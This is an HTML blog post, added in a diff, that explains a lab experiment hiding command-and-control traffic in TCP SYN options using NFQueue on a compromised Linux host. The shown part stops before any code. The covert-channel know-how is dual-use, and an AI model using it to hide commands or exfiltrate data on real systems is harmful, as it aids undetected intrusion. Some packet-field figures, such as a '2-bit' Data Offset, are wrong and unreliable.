@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Quick Intro&#x2F;DisclaimerThis is my first blog post, so please let me know if there’s any way I can improve this post. I expect it to have inaccuracies and maybe have parts that can be explained better.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Command and Control via TCP Handshake">
+<meta property="og:url" content="http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/index.html">
+<meta property="og:site_name" content="thesw4rm Cybersecurity Stuff">
+<meta property="og:description" content="Quick Intro&#x2F;DisclaimerThis is my first blog post, so please let me know if there’s any way I can improve this post. I expect it to have inaccuracies and maybe have parts that can be explained better.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://thirdinternet.com/wp-content/uploads/2017/10/ipv4_packet_header.jpg">
+<meta property="og:image" content="https://lh3.googleusercontent.com/ApoQ91eGRud1HP-l80tXfzLOrOC-Ie0HDh_2CZ9TiaSuaBP5odLaxv9kHs-pSYymEv511kjbmxDYl4e2nF8kkfQQGPE9H_At39dG9Si0d01b1FX4acWFlIN9nbT7Ao8_m_wQPSD8AWELSwBWXW5uVXtzzWCm0HykAIIPUBKxA4dNg_WrmPPX59iMTfpRqzzxwTSY_H89lSmimADuEGYkYVVFcDvMxIMYPWKIv-1QXX96-kLOFyfJkhePZ2KRJncaAfGk3heV-Rcw5ljEc622r3DrSJRBm2El83KcyEbVXAr0do6aPsX9MOUxUAI5iZJtOBlyf5n7BNq3QRqmVm_QFC52avOz3IZ8CXJWHBK7KNZ2JLhthu0bgM4vwlDPKMemow1P3ALqbR9klKvJt5O3G9AK8pRLqUmxsvWZ51BgZwx7enQPc0kwqfgo5PI_QpXC1jK08QUHvYRK-NMWVCV1t0A7GkwI7ksa_Zafm3AsvHczAloL8gw_ck8bdcx4MA9lvdgdqIS8LKIaUrmFOQPM613X9CR9l5mklXKNSrDjzPAC-0ylnoowUpbGabJg2ES21AdNsB1KuriBk55B5k_TSRkmbtCbo4iSazN56OT_iZn3r1nvzB62QdixXVIbVIA_CAjrI0ru6HY6atxAAA6IpfEYTM4_Uuc_vK6cY4rQl95qwbqJEV-n5WJkZCjkeZyrgKd5dSAZwzdF-3iUtvoWzHNom82FjnBFj8EbqVCWzsAgT90=w768-h431-no">
+<meta property="og:image" content="https://lh3.googleusercontent.com/8x-q-9zQtnkNlRhlKgRUCDw5dFFEV7p4vs04eijkdvRriYzkS15rSiZJhLBJr06o5hzMvmW3j2s6onbKEzZWbOC8wYWOwv71g1Wivppxs7vR2FT2ofgmUXXccZUs9f8nSxnzhNkpza-9DKVeRESjA3XRpnGnnikQZqKgtce2qufJ5ss179z5hz3S9kQA1Ke_oi3-n4EDM-GpGUo6T9BG7nepmMOgQ6nr64eftob0cN-8gx6LHZz3pgl7LFpfw77lywh4YE-c0J_yBxevnQC-MZvXckrVqR0x-_53uUS4Rukj1Dh214ZR3iBb_Auy5lyfcg_IbLVKdWtx3qAGvNTeO-yXchhU4yn8GUL25uB2qyYU9DVF57EqD1aYbXhEY5gal6ZOqE9yMoIM9zXi_S4a5P8k5yrhe2mOrHUy_RJ8DmNQgb6UM6Dz435tGeBdZzMErv7H1RvSCQge-n-g2c1yUQmzB8838n4dZ6rr6IL4UcjKawkr7jP1mrrttYabtXg7QlPPAXtc5RscFD3XUoFLukC8qUyIvVAtiFK7R2A-G3MYPxWparIbGAFb0Makzzo6decbt4YsVog1RQh6QmmZ9SqsCZrNm72VX_ydm5xtVywEG-aUbThslSca5HWh69zk-0UeMjCG83KYSup5VQwyGbZGUWUUX8OnTAbzZJVI1uIy3ngJyvdANw=w726-h399-no">
+<meta property="og:image" content="https://lh3.googleusercontent.com/2d8aa20a44kd_ubjF1VpyB_0mv6JS9FXm0jfCe-5qUZSOaKpTXIpYkV_aDA-gaYvy3kuYVWFcGvi_5RuYLzmLKPQ11oC7wDhEQci7FVg_6HBPBZs852NenUzQEN0leWZ6ah2VclWziZqOHPios-jbpcZhqpP-0euy7msVHLdjDENsXR-sAKGnr0kXOtuir85MSxXeBdlEs73waRC69wOuKsHae5M71NyfEskJEYPWdyc9F0XpTluel4cl87tRjwngxBZq41tUUZWozWksx4_bdoBZJXfNhXImiPFlxBIQa_mbQZ1UEVOpLfLN7JP_gPO3bZbRhy_wRdcmQ_KnZccq26JQ59EFlFAe5Q90T_6vBvIR6rI5Yc5h5LtkBCnt99-fKw1VQlDRmum14Xdlv23kBtklAzoidmbM4naImy9vt9W2soKwz7NdPuSNUa9Pp21CDqQTL0AER5gylSoOmULrVGNrcOmG8cHkkgsNbrGYAVHBfoGHcQZf1acwIQMeioE6m63JUBhgBAWcIx6GWOIrg6qN7M7E9jLOIabBtQ-TitWyzxsObn6yeev_d-a3tVU-IRp6b_9l3_D0EXiiSxN--_qgcJj5fJdCi-DbxleEy5-WrgFrt8W8WlkaG3wfa7WRYB2zXiobVJ_FwDxHdkfEUpcSsh16UmiM-P-t9QeOAswT4EFrSSTdxHPpYVuasNjvXtYKKbvDH2_OlaBBmQM6uWMntQx4FnAAz6eLvXIBu2om6g=w399-h287-no">
+<meta property="og:image" content="https://lh3.googleusercontent.com/ozlxRmfURS-_pg3KliUPv3ClXyekX3yQsMeQhjPtwSIcaRnbzP6aB-TUbYW8jVoLd44-LLnPu2N8i5uA6JhMy6NGwInnhI2L7Kbz-HJh_aTLOyhQipkyL1DwKr04KopIwDrHGvqPQvwfdFekYhZ5LhIXumYev7PQUitfKIB9YztAbo3xadGPBUWl_THmXjNNlGslkcLYIcMPzBtAMoY1SLSiFB2fWrD3NfKgI5ATrUBgY83dNnRH0kPgwUE8yPIUxcb3fcqNPKZtuOvDc7x77LWWTcILpakBoVwRW-_96MI-OVn5byGkwOGSh2u21wgYB0_KiDKh8y0FsMXZSTqHdo_wSYtP2lNUfXPHDKHrtoA8MfP4jFeSKw8i6QgwYAWFhY34nUMeaYyue0_AtFfDU2pOdh7a6NbjtxTyMndy7Pkx1dimZaeUUTzRVndndSikNiemgzxD-aUfUGJ-cZ5IcWZyUyYDkrVL9ycy0PZw9O2vFTP5N4t4N35GslQhFP7pLvOrhEmz9oM4tb8NEIekfRvO1hHd4jqMRl6i_U_zQp4zEsTbTM5rtvp3qY60ove80xQmPRWj2WcUVPc-22YoRDjOgBx2QM5uf5UxX4h3v702TqxEgNP42QSU5B_alKn7T4WjSIvxfIDXTMCYDIyrCGpoZSwy-Jj_WvaUy4w1Om5-ULFhpXl91KBoD6uOhPfFRHmReTo6-4-d21PR5wNEeWtScVi5w5w0BI2EPb-lkVxE_xE=w1184-h568-no">
+<meta property="og:image" content="https://lh3.googleusercontent.com/C9INH6puYSdZBvs9NCInsBbsCR54BqG7gBYBVYZOolno7LSSe8nQGu-Gjdj_-hi9LZi8ddiaBmhG2efRTI_D4NOtHOpaCuFy2_vVOjHgcnukSURS8PmQgWj4wn-QZLqe7O93785LThI0J107jgYwLxln728YFA7OpcbWCZXj378ElFYKWUWDt1zB_EhitebTYILgYpLNH2UNSidNgzErehGddpyCTgnRtRYbRmjJZfWErTWNRT7yaGaXEU0Ct96Dr-EmFg1qB9iUREiQ2At_3PyUcWHXsE7b_JwgXsC-7OCn6TPR1VZrjPLlqDlTYJgkP6B8AOciUtZhEyhCc25BG-XTAJW-Bf_FxG5z0Up1oy8n_903mJnq3w6lS-S37qHEN99JWyeC0Z4JQk9xieaJV-Wcphlmtm-MPBH9EfqbRVh_J6oQ6sdTnNYnNSv8SiA3wWUmjZEM9IPxxNa0lAnCHsam584tEfTIWwfqJJXCtToW7u-BYVwA1icybvdxI-m8yw3kAzYaxkR4d48wojqw7Xt4-z3IKMQUy0RgnfDFQ6-wPecdH_WujZYW13nGuhjGAH0OIJjmX-ILIgBz7XWOH7gPurwn7rkIAIjujua7sh3OKUrS7GsLMwy8l0EDCRyVLLF66OhO6SrbBa7LjWvw0aQoy8sfldgIs5LWnq7znUlX9X-ldgGmETNT81C_TUZ1awrmjkNorrbIinczc8g6zweYPn-o9RKDCOHEe8JyCPdS6hY=w808-h301-no">
+<meta property="og:image" content="https://lh3.googleusercontent.com/xXTQxID1VH3XFicvSa-ACl2QBVrpmqk0DsbjV6Gt2N8zJn6QNJE6_yAXc4m83esF_CXXSIBxKcdYAH92cA9-pYz1o7hz2m_jhkwa27FxgXWeCAa3My_qtfDblZAtmxKvU77umg438MglU4NYNcYt37Q2qKm78rGJ5d8H-DlQMySJ6Cun3rF1Zso6zAi_dUVMJjJY1XndUlsr6bSuHGLftDycXaWc8D9gVabT_9OOtoqXtV9k7JhQf3_4puaFytbSey9xQVZ6BZqD_dMLA6-4ACgLWpQYnUudgJCSOsMraSNGgUy5nLvUaE1g7cOCP4C4NacDgz8z3wdxpolUoSzKM7NBQ6buMIST68kMOmWnBiAWAZPvK73AQ_8ed723WX7KzgqAg4CAXa4VHwJNciTCHvV0YpEs8oU2QlhKQBxGJ0Mte-UJdaQkfw8zi8KZMPwcDTRhVE5FFUI7Uf0ORboJ2SsTOlDZSODtylodVUVKXJR9rQII5zrN_6EVN8fxnBLK9hcAVX_Qku5V0xa3F0qhbVu9KgthFRNIF-yLMjWGx3fVlbXsf-wnNlqhOP5q4m7ToKiiHTlpFb0jCjgjttuI2PhNorzZ1zATNT8HCifadSXIcYMUy4UzHnyKDcKhgeb99SjMkGQX8cPPqjgPXV8L7iuVzwqhOGOMwYzLTlu77ISdqYr5e6B1g65rfEcf8SxJGFJ_rjIj2dn_ueXLac1bQBUEsfIze5udk1_GKQs7Xcv2U1s=w1467-h491-no">
+<meta property="og:image" content="https://lh3.googleusercontent.com/AxXaAgOUrYIstv7jUcQuTn3giCdNYkRrccn2VsMCnEyRcqBvwpM4W3Hs0AARRUY3ruEgUifa2X6VNS2FEBodTSy59kmORZePxQVbPTQusIyXj1c7Bp5nawmu6YvuCjzwJ58_AGAcw7wErbdzTK-OmIqg0gtvNmLtTrC5i3qZg7fCCWx7rQETQ4Ykh2DO6kqHBk_AaB2M3u4tIDQfhwK0rrIwxkqSVnbKac6EDNgthjzqzDhdOVLsHLRjwCDVyoGS9_1kggBlcwum6bbbKxTcSOSToQdN8hntvZxdA9sNiF6eNDkaThCrHivoLkeh91Exp8-audEhrwARwduk6lhxDHUHANngk3srCPZpN64g_fImLQ7s7g2UTrdiyzE4JYcx39iWRDoWEXV7Oo3KeYWcCUxOcvhxtkhqHlYAgbPiyN-VW8wqEbxenRaWID8DjDbrWQ2mRpv292kpU3UD8JCr3IhOGV9_rmTKkJSh139Xs6hQFKelhAGfkyEfiZXmMmRfqL2l7pej2nMFu54q3Rvoc5z5CQYthEpolKZ5cQk7vkZe55i81x5S9fpavhtQm3ANBqE1Q7BvXqdV8l9b146BE8dVjY2MSeaWW0WFE9boLF7FFJmOHvujaPWRa-lqz4blM6yfnYg84OnJVH0PyAVZrPcr-HPz8RAHLfjXxN45HuU__XTwPs64H5RWdLgK78_FYwGiuE7W1UFUWs78dUfTHEfhsNQSxsw-W1cb6GoKHRyhgu0=w1280-h140-no">
+<meta property="article:published_time" content="2019-09-15T07:14:35.000Z">
+<meta property="article:modified_time" content="2021-09-19T01:46:26.243Z">
+<meta property="article:author" content="sw4rm">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="C2">
+<meta property="article:tag" content="TCP">
+<meta property="article:tag" content="NFQueue">
+<meta property="article:tag" content="Netfilter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://thirdinternet.com/wp-content/uploads/2017/10/ipv4_packet_header.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Command and Control via TCP Handshake</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+            <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/thesw4rm">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&text=Command and Control via TCP Handshake"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&is_video=false&description=Command and Control via TCP Handshake"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Command and Control via TCP Handshake&body=Check out this article: http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&name=Command and Control via TCP Handshake&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Intro-Disclaimer"><span class="toc-number">1.</span> <span class="toc-text">Quick Intro&#x2F;Disclaimer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">2.</span> <span class="toc-text">Background</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Info"><span class="toc-number"></span> <span class="toc-text">Initial Info</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPV4-packets-are-structured-as-shown-in-this-image"><span class="toc-number">0.0.1.</span> <span class="toc-text">IPV4 packets are structured as shown in this image</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCP-packets-are-structured-as-shown-in-this-image"><span class="toc-number">0.0.2.</span> <span class="toc-text">TCP packets are structured as shown in this image.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFQueue"><span class="toc-number">1.</span> <span class="toc-text">NFQueue</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Building-the-test-environment"><span class="toc-number"></span> <span class="toc-text">Building the test environment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writing-the-code"><span class="toc-number"></span> <span class="toc-text">Writing the code</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Some-stupid-college-kid-boiled-some-plates"><span class="toc-number">1.</span> <span class="toc-text">Some stupid college kid boiled some plates</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breaking-down-the-boilerplate"><span class="toc-number">2.</span> <span class="toc-text">Breaking down the boilerplate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcp-pkt-struct-h"><span class="toc-number">2.0.1.</span> <span class="toc-text">tcp_pkt_struct.h</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main-c"><span class="toc-number">2.0.2.</span> <span class="toc-text">main.c</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Plan-of-attack"><span class="toc-number">3.</span> <span class="toc-text">Plan of attack</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Curl-the-server-from-the-controller"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">Curl the server from the controller</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Let%E2%80%99s-look-at-what-wireshark-shows-filtered-for-just-SYN-packets"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">Let’s look at what wireshark shows (filtered for just SYN packets)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis"><span class="toc-number">3.0.1.</span> <span class="toc-text">Analysis</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Storm-of-Code-Controller"><span class="toc-number">4.</span> <span class="toc-text">The Storm of Code - Controller</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcp-pkt-struct-h-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">tcp_pkt_struct.h</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main-c-1"><span class="toc-number">4.0.2.</span> <span class="toc-text">main.c</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fruit-of-labour"><span class="toc-number">4.1.</span> <span class="toc-text">Fruit of labour</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Controller-Screenshot"><span class="toc-number">4.1.1.</span> <span class="toc-text">Controller Screenshot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Controller-Wireshark"><span class="toc-number">4.1.2.</span> <span class="toc-text">Controller Wireshark</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Storm-of-Code-listener"><span class="toc-number">5.</span> <span class="toc-text">The Storm of Code- listener</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-c-2"><span class="toc-number">5.1.</span> <span class="toc-text">main.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proving-it-worked"><span class="toc-number">5.2.</span> <span class="toc-text">Proving it worked</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener-packet-interception"><span class="toc-number">5.2.1.</span> <span class="toc-text">Listener packet interception</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener-file-contents"><span class="toc-number">5.3.</span> <span class="toc-text">Listener file contents</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusions"><span class="toc-number"></span> <span class="toc-text">Conclusions</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Future-learning"><span class="toc-number">1.</span> <span class="toc-text">Future learning</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Command and Control via TCP Handshake
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">thesw4rm Cybersecurity Stuff</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-15T07:14:35.000Z" itemprop="datePublished">2019-09-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/C2/" rel="tag">C2</a>, <a class="tag-link-link" href="/tags/Linux/" rel="tag">Linux</a>, <a class="tag-link-link" href="/tags/NFQueue/" rel="tag">NFQueue</a>, <a class="tag-link-link" href="/tags/Netfilter/" rel="tag">Netfilter</a>, <a class="tag-link-link" href="/tags/TCP/" rel="tag">TCP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Quick-Intro-Disclaimer"><a href="#Quick-Intro-Disclaimer" class="headerlink" title="Quick Intro/Disclaimer"></a>Quick Intro/Disclaimer</h2><p>This is my first blog post, so please let me know if there’s any way I can improve this post. I expect it to have inaccuracies and maybe have parts that can be explained better. Would appreciate a quick note if any of you notice them! So, all that BS aside, let’s get into it.</p>
+<p> <br>Quick disclaimer: the method presented here probably doesn’t have as much use or application in a real red teaming scenario. The main reason: you need to have root on the victim machine at some point for it to even work, although after having it one time you can configure the victim system so it is not necessary again. I wrote this as primarily because I though it was a cool and creative way to exfiltrate or infiltrate data with hilarious stealth.
+ </p>
+<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Command and control is pretty widely known across the security world. You set up a listener on a victim machine and send commands to it that it then executes, hopefully with root. People have a lot of creative ways to hide the commands that are sent: Cobalt Strike uses timed delays with its beacons, Wireguard can be used to encrypt data while being transferred, etc. However, the problem with all these approaches is that anyone (or anything) that’s monitoring data transfer at the right time and place has the potential to catch these threats. However, who the hell looks so closely at SYN packets? </p>
+<br/>
+<br/>
+
+<h1 id="Initial-Info"><a href="#Initial-Info" class="headerlink" title="Initial Info"></a>Initial Info</h1><p>If you know the structure of an IPV4 or TCP packet or are OK with checking back to see what part of the packet I’m talking about, skip ahead. </p>
+<h4 id="IPV4-packets-are-structured-as-shown-in-this-image"><a href="#IPV4-packets-are-structured-as-shown-in-this-image" class="headerlink" title="IPV4 packets are structured as shown in this image"></a>IPV4 packets are structured as shown in this image</h4><p><img src="https://thirdinternet.com/wp-content/uploads/2017/10/ipv4_packet_header.jpg" alt="&quot;IPV4 Packet Structure&quot;"></p>
+<h4 id="TCP-packets-are-structured-as-shown-in-this-image"><a href="#TCP-packets-are-structured-as-shown-in-this-image" class="headerlink" title="TCP packets are structured as shown in this image."></a>TCP packets are structured as shown in this image.</h4><p><img src="https://lh3.googleusercontent.com/ApoQ91eGRud1HP-l80tXfzLOrOC-Ie0HDh_2CZ9TiaSuaBP5odLaxv9kHs-pSYymEv511kjbmxDYl4e2nF8kkfQQGPE9H_At39dG9Si0d01b1FX4acWFlIN9nbT7Ao8_m_wQPSD8AWELSwBWXW5uVXtzzWCm0HykAIIPUBKxA4dNg_WrmPPX59iMTfpRqzzxwTSY_H89lSmimADuEGYkYVVFcDvMxIMYPWKIv-1QXX96-kLOFyfJkhePZ2KRJncaAfGk3heV-Rcw5ljEc622r3DrSJRBm2El83KcyEbVXAr0do6aPsX9MOUxUAI5iZJtOBlyf5n7BNq3QRqmVm_QFC52avOz3IZ8CXJWHBK7KNZ2JLhthu0bgM4vwlDPKMemow1P3ALqbR9klKvJt5O3G9AK8pRLqUmxsvWZ51BgZwx7enQPc0kwqfgo5PI_QpXC1jK08QUHvYRK-NMWVCV1t0A7GkwI7ksa_Zafm3AsvHczAloL8gw_ck8bdcx4MA9lvdgdqIS8LKIaUrmFOQPM613X9CR9l5mklXKNSrDjzPAC-0ylnoowUpbGabJg2ES21AdNsB1KuriBk55B5k_TSRkmbtCbo4iSazN56OT_iZn3r1nvzB62QdixXVIbVIA_CAjrI0ru6HY6atxAAA6IpfEYTM4_Uuc_vK6cY4rQl95qwbqJEV-n5WJkZCjkeZyrgKd5dSAZwzdF-3iUtvoWzHNom82FjnBFj8EbqVCWzsAgT90=w768-h431-no" alt="&quot;TCP Packet Structure&quot;"></p>
+<br/>
+<br/>
+
+<p>Not much space to hide any data. That makes perfect sense because handshake packets are meant to establish a connection and define parameters for it, not send data themselves. Much of the packet is pre-defined or will cause problems with the connection if changed, like port, flags, etc. The sequence number can encode 4 bytes of data at a time to infiltrate data, but this isn’t good enough. 4 bytes per second might be acceptable for RCE to a server on the Moon in 1969 but we need something that can at least carry the equivalent of a full sentence in English. Meet: the options field.</p>
+<p>TCP Options are absolutely vital in modern day connections. They are what define how data will be transferred from one endpoint to the other. The entire size of a TCP handshake must be at maximum 60 bytes. Thus, there’s a whopping 40 bytes of space available in TCP options. Ten times more than what we just saw! We will actually able to go beyond this in the test environment and the packet will still be accepted. Through research online, I found that the 40 bytes limit is for packets that need to be legit. In practice, an extra long TCP options portion will only be truncated if the packet is re-segmented when it goes through one of its hops. The firewall will (I assume) need to have this 20 byte limit hardcoded and ignore the total length portion of the IPV4 header to truncate all the values.</p>
+<p>However, for the purpose of this experiment we are gonna assume that doesn’t happen and the packet is sent through as it is. In order to add options to the TCP packet, we need to update the “Data Offset” portion which lists the number of 32 bit words in the packet. The TCP packet is 5 words (20 bytes / 32 bits or 4 bytes = 5) and the Data Offset portion is 2 bits, leaving us 251 words to work with: a THICC 1KB of data that could go in the options. More than enough for a couple of commands.</p>
+<p>In addition, although we won’t mess with this in the experimental setup, there is an experimental option that IANA has acknowledged that lets you extend the Data Offset portion by even more. Here’s a <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/draft-ietf-tcpm-tcp-edo-10#page-5">link</a> for those that want to read more into it.</p>
+<h2 id="NFQueue"><a href="#NFQueue" class="headerlink" title="NFQueue"></a>NFQueue</h2><p>Netfilter created a plugin called NFQueue for IPtables to bridge the gap between intercepting packets on the kernel and being able to modify and read them from your own program from userspace. It relies on the <code>libnetfilter_queue</code> library and (initially) root access which sucks, but it won’t stop us. For now, everything will be done through root, but for future work any user with CAP_NET_ADMIN capabilities on the victim can perform this attack as well.</p>
+<p>Back to the topic at hand, NFQueue copies packets from kernel space to userspace for anyone with privileges to mess with them then give a verdict. This verdict could be your everyday ACCEPT, REJECT, DROP, or one of the special NF_REPEAT or NF_QUEUE which either reinserts the modified packet back into the queue or sends it to a different NFQueue listener. </p>
+<p>Enough talk. Time to code.</p>
+<h1 id="Building-the-test-environment"><a href="#Building-the-test-environment" class="headerlink" title="Building the test environment"></a>Building the test environment</h1><p>The test environment I setup is two Ubuntu 18.04 LTS server VMs each with <code>libnetfilter-queue-dev</code> dependencies installed where I refer to one as the <code>listener</code>, the victim machine, and the <code>controller</code>, the attacking machine.</p>
+<h1 id="Writing-the-code"><a href="#Writing-the-code" class="headerlink" title="Writing the code"></a>Writing the code</h1><p>I will be going over how the code actually works. If you just wanna see Wireshark pictures and the result, skip ahead to the screenshots.</p>
+<h2 id="Some-stupid-college-kid-boiled-some-plates"><a href="#Some-stupid-college-kid-boiled-some-plates" class="headerlink" title="Some stupid college kid boiled some plates"></a>Some stupid college kid boiled some plates</h2><p>NFQueue needs a big chunk of boilerplate code to get started. Noone wants to write all that code themselves, so neither will we. The boilerplate I have made for us is a heavily modified version of the Hello World found <a target="_blank" rel="noopener" href="https://github.com/irontec/netfilter-nfqueue-samples/blob/master/sample-helloworld.c">here</a>.</p>
+<p>Initial commit for the controller can be found <a target="_blank" rel="noopener" href="https://gitlab.com/thesw4rm/nfqueue_c2/commit/b7c8741546498b2fc9e3a5b729f2ca8f75da3fa7">here</a></p>
+<p>Initial commit for the listener can be found <a target="_blank" rel="noopener" href="https://gitlab.com/thesw4rm/nfqueue_c2/commit/af50b3297bf2c043a1edc69f5bdd87cfa0885e33">here</a></p>
+<h2 id="Breaking-down-the-boilerplate"><a href="#Breaking-down-the-boilerplate" class="headerlink" title="Breaking down the boilerplate"></a>Breaking down the boilerplate</h2><p>Lots of code here, let’s go over it real quick. </p>
+<hr>
